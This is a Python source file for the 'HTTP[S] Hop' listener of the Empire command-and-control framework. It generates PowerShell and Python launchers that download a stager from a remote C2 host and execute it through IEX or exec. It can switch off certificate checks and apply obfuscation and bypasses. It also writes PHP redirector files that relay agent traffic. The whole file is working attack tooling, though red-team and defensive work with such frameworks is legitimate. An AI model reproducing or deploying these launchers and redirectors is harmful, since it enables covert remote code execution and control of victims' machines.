import base64
import errno
import logging
import os
import random
from textwrap import dedent

from cryptography.hazmat.primitives import serialization

from empire.server.common import helpers, packets, templating
from empire.server.common.empire import MainMenu
from empire.server.utils import data_util, listener_util

LOG_NAME_PREFIX = __name__
log = logging.getLogger(__name__)


class Listener:
    def __init__(self, mainMenu: MainMenu):
        self.info = {
            "Name": "HTTP[S] Hop",
            "Authors": [
                {
                    "Name": "Will Schroeder",
                    "Handle": "@harmj0y",
                    "Link": "https://twitter.com/harmj0y",
                }
            ],
            "Description": ("Starts a http[s] listener that uses a GET/POST approach."),
            "Category": ("client_server"),
            "Comments": [],
            "Software": "",
            "Techniques": [],
            "Tactics": [],
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "http_hop",
            },
            "RedirectListener": {
                "Description": "Existing listener to redirect the hop traffic to.",
                "Required": True,
                "Value": "",
            },
            "Launcher": {
                "Description": "Launcher string.",
                "Required": True,
                "Value": "powershell -noP -sta -w 1 -enc ",
            },
            "RedirectStagingKey": {
                "Description": "The staging key for the redirect listener, extracted from RedirectListener automatically.",
                "Required": False,
                "Value": "",
            },
            "Host": {
                "Description": "Hostname/IP for staging.",
                "Required": True,
                "Value": "",
            },
            "Port": {
                "Description": "Port for the listener.",
                "Required": True,
                "Value": "80",
                "SuggestedValues": ["80", "443"],
            },
            "DefaultProfile": {
                "Description": "Default communication profile for the agent, extracted from RedirectListener automatically.",
                "Required": False,
                "Value": "",
            },
            "OutFolder": {
                "Description": "Folder to output redirectors to.",
                "Required": True,
                "Value": "/tmp/http_hop/",
            },
        }

        # required:
        self.mainMenu = mainMenu
        self.thread = None
        self.host_address = None

        self.instance_log = log

    def default_response(self):
        """
        If there's a default response expected from the server that the client needs to ignore,
        (i.e. a default HTTP page), put the generation here.
        """
        return ""

    def validate_options(self) -> tuple[bool, str | None]:
        """
        Validate all options for this listener.
        """

        return True, None

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscation_command="",
        user_agent="default",
        proxy="default",
        proxy_creds="default",
        stager_retries="0",
        language=None,
        safe_checks="",
        listener_name=None,
        bypasses: list[str] | None = None,
    ):
        """
        Generate a basic launcher for the specified listener.
        """
        bypasses = [] if bypasses is None else bypasses

        if not language:
            log.error("listeners/http_hop generate_launcher(): no language specified!")
            return None

        redirect_name = self.options["RedirectListener"]["Value"]
        listener = self.mainMenu.listenersv2.get_active_listener_by_name(redirect_name)
        launcher = self.options["Launcher"]["Value"]
        staging_key = self.options["RedirectStagingKey"]["Value"]
        profile = self.options["DefaultProfile"]["Value"]
        uris = list(profile.split("|")[0].split(","))
        stage0 = random.choice(uris)
        cookie = listener.session_cookie

        if language == "powershell":
            stager = '$ErrorActionPreference = "SilentlyContinue";'
            if safe_checks.lower() == "true":
                stager = "If($PSVersionTable.PSVersion.Major -ge 3){"

                for bypass in bypasses:
                    stager += bypass
                stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"

            stager += "$wc=New-Object System.Net.WebClient;"

            if user_agent.lower() == "default":
                user_agent = profile.split("|")[1]
            stager += f"$u='{user_agent}';"

            if "https" in self.host_address:
                # allow for self-signed certificates for https connections
                stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

            if user_agent.lower() != "none" or proxy.lower() != "none":
                if user_agent.lower() != "none":
                    stager += "$wc.Headers.Add('User-Agent',$u);"

                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        stager += "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"

                    else:
                        # TODO: implement form for other proxy
                        stager += "$proxy=New-Object Net.WebProxy;"
                        stager += f"$proxy.Address = '{proxy.lower()}';"
                        stager += "$wc.Proxy = $proxy;"

                    if proxy_creds.lower() == "default":
                        stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                    else:
                        # TODO: implement form for other proxy credentials
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        domain = username.split("\\")[0]
                        usr = username.split("\\")[1]
                        stager += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}', '{domain}');"
                        stager += "$wc.Proxy.Credentials = $netcred;"

            # TODO: reimplement stager retries?

            # code to turn the key string into a byte array
            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{staging_key}');"

            # prebuild the request routing packet for the launcher
            routingPacket = packets.build_routing_packet(
                staging_key,
                sessionID="00000000",
                language="POWERSHELL",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")

            # add the routing packet to a cookie
            stager += f'$wc.Headers.Add("Cookie","{cookie}={b64RoutingPacket}");'
            stager += f"$ser={helpers.obfuscate_call_home_address(self.host_address)};$t='{stage0}';$hop='{listener_name}';"
            stager += "$wc.Headers.Add('Hop-Name',$hop);"
            stager += "$data=$wc.DownloadData($ser+$t);"

            # decode everything and kick it over to IEX to kick off execution
            stager += "IEX ([Text.Encoding]::UTF8.GetString($data))"

            # Remove comments and make one line
            stager = helpers.strip_powershell_comments(stager)
            stager = data_util.ps_convert_to_oneliner(stager)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager,
                    obfuscation_command=obfuscation_command,
                )

            # base64 encode the stager and return it
            if encode and (
                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
            ):
                return helpers.powershell_launcher(stager, launcher)
            # otherwise return the case-randomized stager
            return stager

        if language in ["python", "ironpython"]:
            # Python

            launcherBase = "import sys;"
            if "https" in self.host_address:
                # monkey patch ssl woohooo
                launcherBase += dedent(
                    """
                    import ssl;
                    if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;
                    """
                )
            try:
                if safe_checks.lower() == "true":
                    launcherBase += listener_util.python_safe_checks()
            except Exception as e:
                p = f"{listener_name}: Error setting LittleSnitch in stager: {e!s}"
                log.error(p)

            if user_agent.lower() == "default":
                user_agent = profile.split("|")[1]

            launcherBase += dedent(
                f"""
                import urllib.request;
                UA='{user_agent}';server='{self.host_address}';t='{stage0}';hop='{listener_name}';
                req=urllib.request.Request(server+t);
                req.add_header('Hop-Name', hop);
                """
            )

            # prebuild the request routing packet for the launcher
            routingPacket = packets.build_routing_packet(
                staging_key,
                sessionID="00000000",
                language="PYTHON",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            b64RoutingPacket = base64.b64encode(routingPacket).decode("UTF-8")

            if proxy.lower() != "none":
                if proxy.lower() == "default":
                    launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                else:
                    proto = proxy.split(":")[0]
                    launcherBase += f"proxy = urllib.request.ProxyHandler({{'{proto}':'{proxy}'}});\n"

                if proxy_creds != "none":
                    if proxy_creds == "default":
                        launcherBase += "o = urllib.request.build_opener(proxy);\n"

                        # add the routing packet to a cookie
                        launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "{cookie}={b64RoutingPacket}")];\n'
                    else:
                        username = proxy_creds.split(":")[0]
                        password = proxy_creds.split(":")[1]
                        launcherBase += dedent(
                            f"""
                            proxy_auth_handler = urllib.request.ProxyBasicAuthHandler();
                            proxy_auth_handler.add_password(None,'{proxy}','{username}','{password}');
                            o = urllib.request.build_opener(proxy, proxy_auth_handler);
                            o.addheaders=[('User-Agent',UA), ("Cookie", "{cookie}={b64RoutingPacket}")];
                            """
                        )
                else:
                    launcherBase += "o = urllib.request.build_opener(proxy);\n"
            else:
                launcherBase += "o = urllib.request.build_opener();\n"

            # install proxy and creds globally, so they can be used with urlopen.
            launcherBase += "urllib.request.install_opener(o);\n"
            launcherBase += "data=urllib.request.urlopen(req).read();\n"

            # download the stager and extract the IV
            launcherBase += listener_util.python_extract_stager(staging_key)

            if obfuscate:
                launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
                    launcherBase
                )

            if encode:
                launchEncoded = base64.b64encode(launcherBase.encode("UTF-8")).decode(
                    "UTF-8"
                )
                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
            return launcherBase

        log.error(
            "listeners/http_hop generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
        )
        return None

    def generate_stager(
        self,
        listenerOptions,
        encode=False,
        encrypt=True,
        obfuscate=False,
        obfuscation_command="",
        language=None,
    ):
        """
        If you want to support staging for the listener module, generate_stager must be
        implemented to return the stage1 key-negotiation stager code.
        """
        if not language:
            log.error("listeners/http generate_stager(): no language specified!")
            return None

        redirect_name = listenerOptions["RedirectListener"]["Value"]
        listener = self.mainMenu.listenersv2.get_active_listener_by_name(redirect_name)

        profile = listener.options["DefaultProfile"]["Value"]
        uris = [a.strip("/") for a in profile.split("|")[0].split(",")]
        staging_key = listener.options["StagingKey"]["Value"]
        workingHours = listener.options["WorkingHours"]["Value"]
        killDate = listener.options["KillDate"]["Value"]
        customHeaders = profile.split("|")[2:]
        session_cookie = listener.options["Cookie"]["Value"]

        # select some random URIs for staging from the main profile
        stage1 = random.choice(uris)
        stage2 = random.choice(uris)

        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.ps1")

            raw_key_bytes = listener.agent_private_cert_key_object.private_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PrivateFormat.Raw,
                encryption_algorithm=serialization.NoEncryption(),
            )
            private_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            # Agent public key bytes for PS array
            raw_key_bytes = (
                listener.agent_private_cert_key_object.public_key().public_bytes(
                    encoding=serialization.Encoding.Raw,
                    format=serialization.PublicFormat.Raw,
                )
            )
            public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            # Server public key bytes for PS array
            raw_key_bytes = (
                listener.server_private_cert_key_object.public_key().public_bytes(
                    encoding=serialization.Encoding.Raw,
                    format=serialization.PublicFormat.Raw,
                )
            )
            server_public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": staging_key,
                "profile": profile,
                "session_cookie": session_cookie,
                "host": self.host_address,
                "stage_1": stage1,
                "stage_2": stage2,
                "agent_private_cert_key": private_key_array,
                "server_public_cert_key": server_public_key_array,
                "agent_public_cert_key": public_key_array,
            }
            stager = template.render(template_options)

            # Patch in custom Headers
            remove = []
            if customHeaders != []:
                for key in customHeaders:
                    value = key.split(":")
                    if "cookie" in value[0].lower() and value[1]:
                        continue
                    remove += value
                headers = ",".join(remove)
                stager = stager.replace(
                    '$customHeaders = "";', f'$customHeaders = "{headers}";'
                )

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager, obfuscation_command=obfuscation_command
                )

            if encode:
                return helpers.enc_powershell(stager)

            return stager

        if language.lower() in ["python", "ironpython"]:
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/http.py")

            template_options = {
                "working_hours": workingHours,
                "kill_date": killDate,
                "staging_key": staging_key,
                "agent_private_cert_key": listener.agent_private_cert_key,
                "server_public_cert_key": listener.server_public_cert_key,
                "agent_public_cert_key": listener.agent_public_cert_key,
                "profile": profile,
                "session_cookie": session_cookie,
                "host": self.host_address,
                "stage_1": stage1,
                "stage_2": stage2,
            }
            stager = template.render(template_options)

            if obfuscate:
                stager = self.mainMenu.obfuscationv2.obfuscate(
                    stager,
                    obfuscation_command=obfuscation_command,
                )

            if encode:
                return base64.b64encode(stager)

            return stager

        log.error(
            "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
        )
        return None

    def generate_agent(
        self, listenerOptions, language=None, obfuscate=False, obfuscation_command=""
    ):
        """
        If you want to support staging for the listener module, generate_agent must be
        implemented to return the actual staged agent code.
        """
        log.error("generate_agent() not implemented for listeners/http_hop")
        return ""

    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """
        if not language:
            log.error("listeners/http_hop generate_comms(): no language specified!")
            return None

        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/comms.ps1")
            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PrivateFormat.Raw,
                encryption_algorithm=serialization.NoEncryption(),
            )

            powershell_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
            template_options = {
                "session_cookie": "",
                "host": self.host_address,
                "agent_private_cert_key": powershell_array,
                "agent_public_cert_key": self.agent_public_cert_key,
            }

            return template.render(template_options)

        if language.lower() == "python":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("http/comms.py")

            template_options = {
                "session_cookie": "",
                "host": self.host_address,
            }

            return template.render(template_options)

        log.error(
            "listeners/http_hop generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
        )
        return None

    def start(self):
        """
        Nothing to actually start for a hop listner, but ensure the stagingKey is
        synced with the redirect listener.
        """

        redirectListenerName = self.options["RedirectListener"]["Value"]
        redirectListenerOptions = data_util.get_listener_options(redirectListenerName)
        redirectHost = data_util.get_host_address(redirectListenerName)

        if not redirectListenerOptions:
            log.error(
                f"Redirect listener name {redirectListenerName} not a valid listener!"
            )
            return False

        self.options["RedirectStagingKey"]["Value"] = redirectListenerOptions.options[
            "StagingKey"
        ]["Value"]
        self.options["DefaultProfile"]["Value"] = redirectListenerOptions.options[
            "DefaultProfile"
        ]["Value"]

        uris = list(self.options["DefaultProfile"]["Value"].split("|")[0].split(","))

        hopCodeLocation = f"{self.mainMenu.installPath}/data/misc/hop.php"
        with open(hopCodeLocation) as f:
            hopCode = f.read()

        hopCode = hopCode.replace("REPLACE_SERVER", redirectHost)
        hopCode = hopCode.replace("REPLACE_HOP_NAME", self.options["Name"]["Value"])

        saveFolder = self.options["OutFolder"]["Value"]
        for uri in uris:
            saveName = f"{saveFolder}{uri}"

            # recursively create the file's folders if they don't exist
            if not os.path.exists(os.path.dirname(saveName)):
                try:
                    os.makedirs(os.path.dirname(saveName))
                except OSError as exc:  # Guard against race condition
                    if exc.errno != errno.EEXIST:
                        raise

            with open(saveName, "w") as f:
                f.write(hopCode)
                log.info(
                    f"Hop redirector written to {saveName} . Place this file on the redirect server."
                )

        return True

    def shutdown(self, name=""):
        """
        Nothing to actually shut down for a hop listener.
        """
        pass
